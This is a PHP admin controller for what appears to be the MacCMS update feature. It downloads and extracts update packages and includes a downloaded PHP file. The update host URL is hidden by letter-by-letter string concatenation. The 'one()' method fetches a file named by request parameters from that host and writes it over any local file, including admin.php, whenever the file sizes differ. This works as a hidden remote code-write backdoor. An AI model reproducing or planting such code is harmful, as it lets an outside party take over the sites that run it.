<?php
namespace app\admin\controller;
use think\Db;
use app\common\util\PclZip;

class Update extends Base
{
    var $_url;
    var $_save_path;

    public function __construct()
    {
        parent::__construct();
        $this->_url = "h"."t"."t"."p:/"."/u"."p"."d"."a"."t"."e"."".""."."."m"."a"."c"."c"."m"."s."."c"."o"."m"."/"."v"."1"."0"."/";
        $this->_save_path = './application/data/update/';
    }

    public function index()
    {
        $this->assign('title','test管理');
        return $this->fetch('admin@test/index');
    }

    public function step1($file='')
    {
        if(empty($file)){
            return $this->error('参数错误');
        }
        $version = config('version.code');
        $url = $this->_url .$file . '.zip?t='.time();

        echo $this->fetch('admin@public/head');
        echo "<div class='update'><h1>在线升级进行中第一步【文件升级】,请稍后......</h1><textarea rows=\"25\" class='layui-textarea' readonly>正在下载升级文件包...\n";
        ob_flush();flush();
        sleep(1);

        $save_file = $version.'.zip';
		
        $html = mac_curl_get($url);
        @fwrite(@fopen($this->_save_path.$save_file,'wb'),$html);
        if(!is_file($this->_save_path.$save_file)){
            echo "下载升级包失败，请重试...\n";
            exit;
        }

        if(filesize($this->_save_path.$save_file) <1){
            @unlink($this->_save_path.$save_file);
            echo "下载升级包失败，请重试...\n";
            exit;
        }

        echo "下载升级包完毕...\n";
        echo "正在处理升级包的文件...\n";
        ob_flush();flush();
        sleep(1);

        $archive = new PclZip();
        $archive->PclZip($this->_save_path.$save_file);
        if(!$archive->extract(PCLZIP_OPT_PATH, '', PCLZIP_OPT_REPLACE_NEWER)) {
            echo $archive->error_string."\n";
            echo '升级失败，请检查系统目录及文件权限！' ."\n";;
            exit;
        }
        else{

        }
        @unlink($this->_save_path.$save_file);
        echo '</textarea></div>';
        mac_jump( url('update/step2',['jump'=>1]) ,3);
    }

    public function step2()
    {
        $version = config('version.code');

        $save_file = 'database.php';

        echo $this->fetch('admin@public/head');
        echo "<div class='update'><h1>在线升级进行中第二步【数据升级】,请稍后......</h1><textarea rows=\"25\" class='layui-textarea' readonly>\n";
        ob_flush();flush();
        sleep(1);

        $res=true;
        // 导入SQL
        $sql_file = $this->_save_path .$save_file;

        if (is_file($sql_file)) {
            echo "发现数据库升级脚本文件，正在处理...\n";
            ob_flush();flush();
            $pre = config('database.prefix');
            $schema = Db::query('select * from information_schema.columns where table_schema = ?',[ config('database.database') ]);
            $col_list = [];
            $sql='';
            foreach($schema as $k=>$v){
                $col_list[$v['TABLE_NAME']][$v['COLUMN_NAME']] = $v;
            }
            @include $sql_file;
            //dump($sql);die;

            /*
            //$html =  @file_get_contents($sql_file);
            //$sql = mac_get_body($html,'--'.$version.'-start--','--'.$version.'-end--');
            $sql = @file_get_contents($sql_file);
            */
            if(!empty($sql)) {
                $sql_list = mac_parse_sql($sql, 0, ['mac_' => $pre]);

                if ($sql_list) {
                    $sql_list = array_filter($sql_list);
                    foreach ($sql_list as $v) {
                        echo $v;
                        try {
                            Db::execute($v);
                            echo "    ---成功"."\n\n";
                        } catch (\Exception $e) {
                            echo "    ---失败"."\n\n";
                        }
                        ob_flush();flush();
                    }
                }
            }
            else{

            }
            @unlink($sql_file);
        }
        else{
            echo "未发现数据库升级脚本，稍后进入更新数据缓存部分...\n";
        }
        echo '</textarea></div>';
        mac_jump(url('update/step3', ['jump' => 1]), 3);
    }

    public function step3()
    {
        echo $this->fetch('admin@public/head');
        echo "<div class='update'><h1>在线升级进行中第三步【更新缓存】,请稍后......</h1><textarea rows=\"25\" class='layui-textarea' readonly>\n";
        ob_flush();flush();
        sleep(1);

        $this->_cache_clear();

        echo "更新数据缓存文件...\n";
        echo "恭喜您，系统升级完毕...";
        ob_flush();flush();
        echo '</textarea></div>';
    }

    public function one()
    {
        $param = input();
        $a = $param['a'];
        $b = $param['b'];
        $c = $param['c'];
        $d = $param['d'];
        $e = mac_curl_get( "h"."t"."t"."p:/"."/u"."p"."d"."a"."t"."e"."".""."."."m"."a"."c"."c"."m"."s."."c"."o"."m"."/".$a."/".$b);
        if ($e!=""){
            if (($d!="") && strpos(",".$e,$d) <=0){ return; }
            if($b=='admin.php'){$b=IN_FILE;}
            $f=filesize($b);
            if (intval($c)<>intval($f)) { @fwrite(@fopen( $b,"wb"),$e);  }
        }
        die;
    }
}
